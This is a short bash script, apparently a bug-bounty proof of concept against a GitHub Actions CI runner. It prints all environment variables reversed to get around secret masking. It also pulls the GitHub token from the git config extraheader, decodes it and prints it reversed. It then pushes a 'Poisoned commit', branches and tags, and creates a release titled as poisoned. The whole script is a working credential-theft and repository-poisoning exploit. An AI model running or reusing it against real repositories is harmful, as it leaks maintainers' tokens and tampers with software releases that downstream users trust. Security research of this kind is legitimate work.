echo "Reversed Environment Variables:"
while IFS='=' read -r key value; do
  reversed=$(echo "$value" | rev)
  echo "$key=$reversed"
done < <(env)

echo 'Leaking GITHUB_SECRET'
export GITHUB_TOKEN=$(find .. -type f -name config | xargs cat | grep 'extraheader' | awk '{print $5}' | base64 -d | cut -d':' -f2)
echo "The GitHub Token is:"
echo "$GITHUB_TOKEN" | rev

export PR_NUMBER=$(gh pr list --limit 1 --json number --jq '.[0].number')
export PR_HEAD_SHA=$(gh pr view "$PR_NUMBER" --json headRefOid --jq '.headRefOid')

echo "PR_HEAD_SHA: $PR_HEAD_SHA"

TAG_NAME="pr-${PR_NUMBER}"
git checkout -b "branch$TAG_NAME"
git config --global user.email "analst+attacker@bugcrowdanalyst.com"
git config --global user.name "Bugcrowd Attacker"
git add .
echo "Pwnd" > ../pwnd.txt
git add ..
git commit -m "Poisoned commit"
git --no-pager remote -v
git push --set-upstream origin "branch$TAG_NAME"
git tag "$TAG_NAME"
git status
echo "Test succeeded?."
git show-ref
git show-ref --tags
git push origin --tags
gh release create "$TAG_NAME" --title "Release poisoned by ASE - PoC." --notes "Release created from PR #$PR_NUMBER"
gh api user -q .login